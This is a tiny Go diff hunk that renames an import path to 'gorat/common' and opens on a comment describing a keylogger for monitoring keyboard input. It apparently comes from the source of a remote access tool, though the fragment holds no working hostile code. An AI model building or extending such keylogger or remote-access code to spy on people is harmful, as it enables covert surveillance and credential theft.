@@ -7,7 +7,7 @@ import (
 	"sync"
 	"time"
 
-	"mww2.com/server_manager/common"
+	"gorat/common"
 )
 
 // Keylogger handles keyboard input monitoring
